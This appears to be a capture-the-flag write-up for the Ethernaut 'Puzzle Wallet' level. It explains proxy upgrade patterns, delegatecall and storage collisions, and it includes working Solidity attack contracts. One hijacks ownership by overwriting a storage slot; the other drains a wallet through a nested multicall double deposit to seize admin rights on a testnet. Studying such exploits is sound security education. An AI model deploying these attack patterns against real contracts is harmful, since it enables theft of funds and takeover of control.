
<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel24.svg">

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

Challenge's message:

> Nowadays, paying for DeFi operations is impossible, fact. A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this. They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners. Little did they know, their lunch money was at risk… You'll need to hijack this wallet to become the admin of the proxy.


This set of Solidity contracts involves a proxy pattern and a wallet-like functionality with additional features. Let's break down the code and its functionalities step by step.

The `PuzzleProxy` contract is a proxy contract that allows for upgrading the implementation contract while preserving the state. It also introduces an administrative mechanism for managing ownership and administrative changes.

- `pendingAdmin` and `admin`: These variables represent the pending administrator and the current administrator of the proxy contract.

- `constructor()`: The constructor initializes the contract with an initial administrator (`_admin`), initial implementation (`_implementation`), and initialization data (`_initData`).

- `modifier onlyAdmin`: A modifier to restrict certain functions to be callable only by the current administrator.

- `proposeNewAdmin()`: Allows a new administrator to be proposed. This is a two-step process: an address can propose a new administrator, but it needs to be approved by the existing admin.

- `approveNewAdmin()`: Allows the current admin to approve the proposed new admin.

- `upgradeTo()`: This function is used to upgrade the implementation contract to a new address. Only the admin can initiate an upgrade.




The `PuzzleWallet` contract implements a simple wallet with additional controls.

- `owner`: Stores the address of the contract owner.

- `maxBalance`: Sets a maximum balance that the contract can hold.

- `whitelisted`: A mapping that indicates whether an address is whitelisted.

- `balances`: A mapping that stores the balances of different addresses in the wallet.

- `init()`: Initializes the contract by setting the maximum balance and owner. This can only be called once.

- `modifier onlyWhitelisted`: A modifier that restricts functions to be callable only by whitelisted addresses.

- `setMaxBalance()`: Allows the owner to set the maximum balance, but only if the contract balance is currently 0.

- `addToWhitelist()`: Allows the owner to add an address to the whitelist.

- `deposit()`: Allows whitelisted addresses to deposit funds into the contract, but the total balance must not exceed the maximum balance.

- `execute()`: Executes a transaction to a specified address, transferring a specified value along with the provided data. The caller must have sufficient balance.

- `multicall()`: Allows whitelisted addresses to execute multiple functions in a single call using delegatecall. It ensures that the `deposit` function can only be called once.


It's important to understand that the delegatecall in the `multicall` function can be risky if not used carefully, as it can allow the called contract to manipulate the state of the caller contract.

## Upgradeable Contracts

Smart contracts on Ethereum are self-executing programs that run in the Ethereum Virtual Machine (EVM). These programs are immutable by design, which prevents any updates to the business logic once the contract is deployed. While immutability is necessary for trustlessness, decentralization, and security of smart contracts, it may be a drawback in certain cases. For instance, immutable code can **make it impossible for developers to fix vulnerable contracts**.

However, increased research into improving smart contracts has led to the introduction of several **upgrade patterns**. These upgrade patterns enable developers to upgrade smart contracts (while preserving immutability) by placing business logic in different contracts.

<p align="center"><img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Puzzle%20Wallet/src/upgradable-smart-contracts.png"></p>

A smart contract upgrade **involves changing the business logic of a smart contract while preserving the contract's state**. It is important to clarify that **upgradeability and mutability are not the same**, especially in the context of smart contracts.

You still cannot change a program deployed to an address on the Ethereum network. But you can change the code that's executed when users interact with a smart contract. This can be done via the following methods:

- **Creating multiple versions of a smart contract and migrating state from the old contract to a new instance of the contract**.
- **Creating separate contracts to store business logic and state**.
- **Using proxy patterns to delegate function calls from an immutable proxy contract to a modifiable logic contract**.
- **Creating an immutable main contract that interfaces with and relies on flexible satellite contracts to execute specific functions**.
- **Using the diamond pattern to delegate function calls from a proxy contract to logic contracts**.

Upgradable contracts in the blockchain context are smart contracts designed with a mechanism to allow their logic to be modified after deployment. This is achieved by **separating the contract's state and logic into different contracts, with the logic contract being replaceable**.

Here's a simplified version of how it works:

<p align="center"><img width="600" src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Puzzle%20Wallet/src/data-proxy.png"></p>


1. **Data Contract (Storage Contract)**: This contract holds all the state variables and data of your dApp. Once deployed, it remains unchanged. It is also responsible for **delegating calls to the logic contract**.



2. **Logic Contract (Functional Contract)**: This contract contains the business logic that can manipulate the data stored in the Data Contract. This contract can be upgraded by deploying a new version and updating the address of the logic contract in the Data Contract.

3. **Proxy Contract**: This contract is responsible for **forwarding calls and data from the user to the correct logic contract and returning the results to the caller**. This contract also holds the address of the current Logic Contract.

The process of upgrading involves deploying a new logic contract and updating the address in the proxy contract. This way, the state remains consistent, while the logic can be upgraded. 


<p align="center"><img height="350" src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Puzzle%20Wallet/src/upgradable-smart-contracts-2.png"></p>

If you looking forward more about upgreadable contracts, you would see [this article.](https://blog.chain.link/upgradable-smart-contracts/)

## Using Delegatecall For Upgreading UUPS

Delegatecall is a powerful feature in Solidity that allows one contract to "borrow" code from another contract, while preserving the state of the calling contract. This feature is often used in upgradeable contracts, where the logic of a contract can be changed by simply pointing to a new contract with the updated code.

Here's a basic example of how you can use delegatecall in an upgradeable contract:

```solidity
pragma solidity ^0.8.0;

contract LogicContract {
    function pwn() public pure returns(string memory) {
        return "Hello";
    }
}

contract ProxyContract {
    address public logicContract;

    constructor(address _logicContract) {
        logicContract = _logicContract;
    }

    function upgradeLogic(address _newLogicContract) public {
        logicContract = _newLogicContract;
    }

    fallback() external {
        (bool success, ) = logicContract.delegatecall(msg.data);
        require(success, "Delegatecall failed");
    }
}
```

In this example, `ProxyContract` is the upgradeable contract. It uses `delegatecall` in its fallback function to execute code in `LogicContract`. When you want to upgrade the contract, you simply call `upgradeLogic` with the address of the new logic contract.

Also pay attention that when you use `delegatecall` for update values in the UUPS, this change also **affects the logic contract's storage because of sharing with the same storage structure**. 

<p align="center"><img height="175" src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Puzzle%20Wallet/src/UUPS_upgradability.png"></p>


What is more, this feature can be manipulated by hackers to **trigger a storage collision** in the target contracts. Shortly, using `delegatecall` can be risky because it executes another contract's code in the context of the calling contract, which can lead to unexpected behaviour if not used correctly.

If you are more interested in using delegatecall cause of critical weaknesses, check Halborn's article [from here](https://www.halborn.com/blog/post/delegatecall-vulnerabilities-in-solidity).

## Storage Collisions

We already know that when a delegatecall is used to update storage in Solidity, the state variables have to be declared in the same order. But what happens if we forget to declare the variables in the same order or declare the wrong type?

Let's create the two contracts, Library and Vulnerable:

```solidity
contract Library {
    uint public number;

    function updateNumber(uint _number) public {
        number = _number;
    }
}

contract Vulnerable {
    address public library;
    address public owner;
    uint public number;

    constructor(address _library) {
        library = _library;
        owner = msg.sender;
    }

    function updateNumber(uint _number) public {
        library.delegatecall(abi.encodeWithSignature("updateNumber(uint256)", _number));
    }
}
```

In the above code, we have two contracts. The first contract, Library, defines a state variable called number. It also has a function called saveNumber(). This function simply updates the value of number. In the second contract called Vulnerable, three state variables are defined. These are library, owner, number. The contract assigns the value of library to the address of the Library contract. It also sets the value of owner to msg.sender.

Finally, the Vulnerable contract also has a function called updateNumber() which takes in a unit, just like Library.updateNumber(). Vulnerable.updateNumber() makes a delegatecall using the address of the Library contract. Inside the delegatecall, it makes a request to the updateNumber() function inside the Library contract.

Now, let us make some observations. We first notice that the contract Library declares only one state variable, but the contract Vulnerable declares three state variables. This is the weak spot where any attacker will try to start exploiting the contract, Vulnerable. As we did in the last example, let us see how the owner of the Vulnerable contract can be hijacked because of this mistake. Take a look at this contract written to attack the Vulnerable contract:

```solidity
contract AttackVulnerable {

    address public library;
    address public owner;
    uint public number;

    Vulnerable public vulnerable;

    constructor(Vulnerable _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    function attack() public {
        vulnerable.updateNumber(uint(address(this)));
        vulnerable.updateNumber(1);
    }

    // function signature must match Vulnerable.updateNumber()
    function updateNumber(uint _number) public {
        owner = msg.sender;
    }
}
```

From the above code, our attacker is the contract called AttackVulnerable. The first thing we observe is that this contract has three state variables. These variables are in the same layout as the ones in the Vulnerable contract. It also has a state variable that holds the address of the Vulnerable contract. The actual value of the variable is assigned in the constructor.

```solidity
// The storage layout is the same as Vulnerable
    // This will allow the attacker to correctly update the state variables
    address public library;
    address public owner;
    uint public number;

  //The state variable to store the address of the contract, Vulnerable
    Vulnerable public vulnerable;

  //constructor
  constructor(Vulnerable _vulnerable) {
          vulnerable = Vulnerable(_vulnerable);
      }
```

Next, the attacker defines a function called **attack()**. In this function, the attacker calls the updateNumber() function inside the Vulnerable contract **twice**.

```solidity
function attack() public {
        // override address of library
        vulnerable.updateNumber(uint(address(this)));
        // call the function updateNumber() with any number as input.
        vulnerable.updateNumber(1);
    }
```

In the first call, the attacker passes his address as an argument to the `Vulnerable.updateNumber()` function. However, `Vulnerable.updateNumber()` takes a uint as its argument. To overcome this, the attacker cleverly **casts his address to uint**.

When the first call is executed, it will call the updateNumber() inside the Vulnerable contract. **The value of num will be the address of the attacker casted into a uint**. Vulnerable.updateNumber() will then delegatecall to the Library contract. This will call the updateNumber() function inside the Library contract.

Once this function is called, it will proceed to update the state variable inside it. This will set the state variable to the address of the attacker. Back inside the Vulnerable contract, the first variable will be updated since only the first variable in the Library contract was updated. Since the first variable in the Vulnerable contract is the address of the Library contract, the address of the Library contract will be updated to the address of the AttackVulnerable contract.

At this point, the execution of the first call is completed. So what happens when the second call, `vulnerable.updateNumber(1);` is made? Let’s find out:

When this is called, it will call the **updateNumber()** function inside the Vulnerable contract, as expected. Remember that the `Vulnerable.updateNumber()` function makes a delegatecall to the Library contract by using the value stored in the library state variable. However, the value of the library variable has been updated by the previous call. This means **the function will make a delegatecall to the AttackVulnerable contract**.

Once a delegatecall has been made to the AttackVulnerable contract, the `AttackVulnerable.updateNumber()` function is called. Let’s have a quick look at what the function does:

```solidity
function updateNumber(uint _number) public {
        owner = msg.sender;
    }
```

From the above code, we can see that it updates the owner state variable. But in this case, which owner state variable is going to be updated? Since the whole operation runs inside the context of the Vulnerable contract, **the owner state variable that will be updated** is the one inside the Vulnerable contract. Also, since msg.sender is the attacker’s address, Vulnerable’s address will be updated to the attacker’s address, making him the new owner of the Vulnerable contract.




# Subverting


After an exhausting explanation, finally, we arrived hacking part :D We are certainly sure that we must be the admin of the proxy contract to pass the challenge. But how is that possible? Maybe we need to think backwards some points. Prepare coffies!

<p><img height="150" src="https://media.tenor.com/9ItR8nSuxE0AAAAC/thumbs-up-computer.gif"></p>

First of all, we must be the owner of the contract to whitelisted our address. So, we will **trigger a storage collision in the first slots** of the `ProxyWalllet` and `PuzzleWallet` contracts. It just so happens that in the first slot's values of this contracts are belong to `pendingAdmin` and `owner` variables. In other words, when we can change the pendingAdmin's value, we will **automatically update the owner's value**. Thanks to the `proposeNewAdmin()` function, we will set this address as our attack contract's address. After then, we will be owner and whitelisted.


The second thing we need to do that call the `setMaxBalance` function to change the `maxBalance` variable's value. In another saying, set `admin` as our address with helping of storage collision in the second slot of target contracts. Yes, same surprise. 

Unfortunately, the work isn't quite easy as seen. We must **set to zero of the contract's balance** because of skipping `address(this).balance == 0, "Contract balance is not 0"` requirement. When look at the balance of contract from etherscan, we have seen it's balance.

<p align="center"><img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Puzzle%20Wallet/src/balance.png"></p>


As you can see, it's balance is 0.001 ether. 


```solidity
pragma solidity ^0.8.20;

interface IPuzzleWallet {
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to,uint256 value,bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract Attack {

    IPuzzleWallet target;

    constructor(address _target) payable {
        target = IPuzzleWallet(_target);
    }

    function attack()external payable{
        target.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));
        bytes[] memory multicall_data = new bytes[](1);
        multicall_data[0] = abi.encodeWithSelector(target.deposit.selector);
        bytes[] memory data = new bytes[](2);
        data[0] = multicall_data[0];
        data[1] = abi.encodeWithSelector(target.multicall.selector,multicall_data);
        target.multicall{value: 0.001 ether}(data);
        target.execute(msg.sender, 0.002 ether, "");
        target.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
```

Deploy the attack contract with sending 0.001 ether. See transaction [on etherscan.](https://sepolia.etherscan.io/tx/0x2da8bb4ebf2d5d08fb66fb35243b48e32291ee1e1fa3d4593bf2b3cf6926cb79)

Check the owner of the `PuzzleWallet` contract.

```js
await contract.owner()
'0x725595BA16E76ED1F6cC1e1b65A88365cC494824'
```

Call the attack funcion and get the ownership of the proxy contract! See transaction [on etherscan.](https://sepolia.etherscan.io/tx/0x3d7753c99a314a2fd73ff6c742302572fbb7b65320cca9b0504a84407e2492ef)


As you can see, we got ownership successfully which means we are admin of the `ProxyWallet` contract with **manipulating stroge slots of proxy contract using delegatecall** in the multicall() function.

```js
await contract.owner()
'0x161b32b093F93FF8F43C250a448cA66a7fed4374'
```


Ethernaut's message:

> Next time, those friends will request an audit before depositing any money on a contract. Congrats! Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level. Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, msg.value will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple delegatecalls to a function that looks safe on its own could lead to unwanted transfers of ETH, as delegatecalls keep the original msg.value sent to the contract. Move on to the next level when you're ready!


### Security Takeaways

### Read More

- **Deeply understand what proxy upgrade pattern on the UUPS thanks to** [***OpenZeppelin's docs***](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies).
- **Such a good explanation about proxy patterns from** [***OpenZeppelin's post***](https://blog.openzeppelin.com/proxy-patterns).
- **Inspirational research about proxy pattern issiues from** [***Nomic Foundation's article***](https://medium.com/nomic-foundation-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357) **and** [***ZeppelinOS auidit reports***](https://medium.com/nomic-foundation-blog/zeppelinos-smart-contracts-audit-dc772cfae224).

**_by wasny0ps_**
